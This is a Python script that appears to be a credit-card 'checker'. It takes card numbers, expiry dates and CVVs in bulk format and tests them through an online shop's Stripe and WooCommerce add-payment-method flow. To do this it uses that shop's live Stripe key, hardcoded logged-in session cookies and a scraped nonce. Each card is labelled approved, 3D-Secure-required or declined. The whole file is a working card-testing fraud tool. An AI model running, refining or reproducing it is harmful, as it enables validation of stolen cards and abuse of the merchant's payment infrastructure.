import requests
import re
import uuid
import time
from fake_useragent import UserAgent
import json

def process_card_sr(ccx):
    """
    Process credit card through Stripe Auth 3 gateway
    Returns: dict with status, response, and gateway
    """
    ccx = ccx.strip()
    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            return {
                "status": "ERROR",
                "response": "Invalid format. Use: CC|MM|YY|CVV",
                "gateway": "Stripe Auth 3"
            }
        
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        # Format year if needed
        if "20" in yy:
            yy = yy.split("20")[1]
        
        user_agent = UserAgent().random
        stripe_mid = str(uuid.uuid4())
        stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

        # Step 1: Create payment method with Stripe
        payment_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'billing_details[address][country]': 'IN',
            'key': 'pk_live_51MwBNkAT1AjY4ti4CFEf5XOngsij057CWptrz6UoXwTkxpPshPAubO2QvIbfX6CiSzzVpeqh9D6pka0BJDRANj6q00QZ0G0p98',
        }

        stripe_headers = {
            'User-Agent': user_agent,
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
        }

        try:
            pm_response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                data=payment_data,
                headers=stripe_headers,
                timeout=15
            )
            
            pm_data = pm_response.json()

            if 'id' not in pm_data:
                error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
                return {
                    "status": "DECLINED",
                    "response": f"Payment Error: {error_msg}",
                    "gateway": "Stripe Auth 3"
                }

            payment_method_id = pm_data['id']

        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Payment Method Failed: {str(e)}",
                "gateway": "Stripe Auth 3"
            }

        # Step 2: Get nonce from the website
        cookies = {
            'PHPSESSID': '4me8rea1cb6rprdrlk1t8et3rr',
            'wordpress_logged_in_fba2a6933bc7143f3fbecfd01d047118': 'Teggedjst336%7C1757562651%7CYACxGaiktKQ0ds3VSEaJGFuMZ9NzslVh1rJqAeO9ZKn%7C34038ea86be2e8e60bc6365761d74f9cb054f33671c6bbebcf87cfd4cdf0de26',
            '__stripe_mid': stripe_mid,
            '__stripe_sid': stripe_sid,
        }

        headers = {
            'User-Agent': user_agent,
            'Referer': 'https://www.realoutdoorfood.shop/my-account/add-payment-method/',
        }

        try:
            nonce_response = requests.get(
                'https://www.realoutdoorfood.shop/my-account/add-payment-method/',
                headers=headers,
                cookies=cookies,
                timeout=15
            )

            # Extract the setup intent nonce
            setup_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', nonce_response.text)
            if setup_nonce_match:
                nonce = setup_nonce_match.group(1)
            else:
                return {
                    "status": "ERROR",
                    "response": "Failed to extract setup intent nonce",
                    "gateway": "Stripe Auth 3"
                }
                    
        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Nonce Retrieval Failed: {str(e)}",
                "gateway": "Stripe Auth 3"
            }

        # Step 3: Create and confirm setup intent
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        headers = {
            'User-Agent': user_agent,
            'Referer': 'https://www.realoutdoorfood.shop/my-account/add-payment-method/',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.realoutdoorfood.shop',
            'x-requested-with': 'XMLHttpRequest',
        }

        try:
            setup_response = requests.post(
                'https://www.realoutdoorfood.shop/wp-admin/admin-ajax.php',
                headers=headers,
                cookies=cookies,
                data=data,
                timeout=15
            )
            
            setup_data = setup_response.json()
            
            # Parse response
            if setup_data.get('success', False):
                data_status = setup_data['data'].get('status')
                if data_status == 'requires_action':
                    return {
                        "status": "APPROVED_OTP",
                        "response": "3D Secure Required",
                        "gateway": "Stripe Auth 3"
                    }
                elif data_status == 'succeeded':
                    return {
                        "status": "APPROVED",
                        "response": "Payment Succeeded",
                        "gateway": "Stripe Auth 3"
                    }
                elif 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    return {
                        "status": "DECLINED",
                        "response": error_msg,
                        "gateway": "Stripe Auth 3"
                    }

            if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                return {
                    "status": "DECLINED",
                    "response": error_msg,
                    "gateway": "Stripe Auth 3"
                }

            return {
                "status": "DECLINED",
                "response": "Payment Declined",
                "gateway": "Stripe Auth 3"
            }

        except Exception as e:
            return {
                "status": "ERROR",
                "response": f"Setup Intent Failed: {str(e)}",
                "gateway": "Stripe Auth 3"
            }

    except Exception as e:
        return {
            "status": "ERROR",
            "response": f"Processing Error: {str(e)}",
            "gateway": "Stripe Auth 3"
        }
